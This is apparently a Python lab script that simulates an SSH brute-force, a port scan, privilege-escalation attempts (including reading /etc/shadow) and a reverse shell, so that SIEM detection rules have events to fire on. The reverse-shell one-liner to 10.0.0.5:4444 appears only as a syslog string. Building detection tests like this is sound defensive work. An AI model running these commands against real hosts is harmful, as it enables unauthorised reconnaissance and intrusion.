#!/usr/bin/env python3
# ==============================================================================
# Enterprise SIEM & Threat Detection Platform - Attack Simulation Laboratory
# ==============================================================================
# WARNING: For educational and local validation use only. Do NOT run this tool
#          against production hosts or networks without authorized permissions.
# ==============================================================================

import os
import sys
import time
import socket
import argparse
import subprocess

DISCLAIMER = """
================================================================================
                    CYBERSECURITY LAB ATTACK SIMULATOR
================================================================================
[WARNING] This script simulates typical malicious actions to test SIEM logging,
          rule ingestion, and active response. Run this ONLY on sandbox VMs.
================================================================================
"""

def simulate_ssh_brute_force(target_ip, target_port=22, attempts=10):
    """Simulates a brute-force SSH attack by executing fast socket connections."""
    print(f"[*] Starting SSH Brute Force Simulation -> Targeting: {target_ip}:{target_port}")
    print(f"[*] Generating {attempts} failed authentication attempts...")
    
    for i in range(1, attempts + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((target_ip, target_port))
            # Send invalid SSH identification string to force failure/log
            s.sendall(b"SSH-2.0-MaliciousBruteForcer_v1.0\r\n")
            time.sleep(0.1)
            s.close()
            print(f"  [+] Attempt {i}/{attempts}: Packet dispatched.")
        except Exception as e:
            print(f"  [-] Connection error at attempt {i}: {e}")
        time.sleep(0.2)
    print("[+] SSH brute-force simulation complete.\n")

def simulate_port_scan(target_ip, start_port=1, end_port=100):
    """Simulates reconnaissance port scans by probing ports in rapid succession."""
    print(f"[*] Starting Port Scan Simulation -> Targeting: {target_ip} (Ports {start_port}-{end_port})")
    
    scanned_ports = []
    for port in range(start_port, end_port + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            result = s.connect_ex((target_ip, port))
            if result == 0:
                print(f"  [+] Port {port} is open!")
                scanned_ports.append(port)
            s.close()
        except Exception:
            pass
    print(f"[+] Scan finished. Discovered open ports: {scanned_ports}\n")

def simulate_privilege_escalation():
    """Simulates privilege escalation by executing suspicious sudo actions."""
    print("[*] Starting Privilege Escalation Simulation...")
    
    # 1. Attempting to access sensitive folders/logs
    print("[*] Action 1: Attempting to read /etc/shadow directly...")
    try:
        subprocess.run(["cat", "/etc/shadow"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception:
        pass
        
    # 2. Executing unauthorized sudo check
    print("[*] Action 2: Triggering invalid sudo command sequence...")
    try:
        # Run sudo command with non-existent parameters or run su to generate a log entry
        subprocess.run(["sudo", "-u", "invaliduser", "id"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception:
        pass
        
    # 3. Simulate su to root (creates auth log entries)
    print("[*] Action 3: Spawning test su command...")
    try:
        subprocess.run(["su", "root", "-c", "whoami"], input=b"wrongpassword\n", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception:
        pass
        
    print("[+] Privilege escalation simulation complete.\n")

def simulate_reverse_shell():
    """Simulates a reverse shell fingerprint by generating specific log strings."""
    print("[*] Starting Reverse Shell Detection Simulation...")
    print("[!] Generating reverse shell indicators in logs...")
    
    # We log this directly to syslog to safely trigger the Wazuh /bin/sh matching rules
    # without running a real reverse connection that opens ports.
    log_string = "firewall: attack detected from IP 192.168.1.100: portscan. Executed reverse shell: bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
    
    try:
        # Check if running on Linux and logger exists
        if os.path.exists("/usr/bin/logger"):
            subprocess.run(["logger", "-t", "network-sensor", log_string])
            print("[+] Dispatched syslog signature for reverse shell.")
        else:
            # Output locally for offline verification
            print(f"[Offline Log Simulator] System logger missing. Event raw payload:\n{log_string}")
    except Exception as e:
        print(f"[-] Failed to execute system logger: {e}")
    print("[+] Reverse shell simulation complete.\n")

def main():
    print(DISCLAIMER)
    
    parser = argparse.ArgumentParser(description="Cybersecurity Lab Attack Simulator")
    parser.add_argument("--mode", choices=["ssh", "scan", "privesc", "shell", "all"], required=True,
                        help="Attack simulation vector mode.")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address (default: localhost)")
    parser.add_argument("--ports", default="1-100", help="Port range for scan (default: 1-100)")
    
    args = parser.parse_args()
    
    if args.mode == "ssh":
        simulate_ssh_brute_force(args.target)
    elif args.mode == "scan":
        try:
            start_p, end_p = map(int, args.ports.split("-"))
            simulate_port_scan(args.target, start_p, end_p)
        except ValueError:
            print("[-] Invalid ports range. Format example: 1-100")
    elif args.mode == "privesc":
        simulate_privilege_escalation()
    elif args.mode == "shell":
        simulate_reverse_shell()
    elif args.mode == "all":
        simulate_ssh_brute_force(args.target, attempts=5)
        simulate_port_scan(args.target, 1, 50)
        simulate_privilege_escalation()
        simulate_reverse_shell()
        print("[+] Combined simulation suite finished successfully.")

if __name__ == '__main__':
    main()
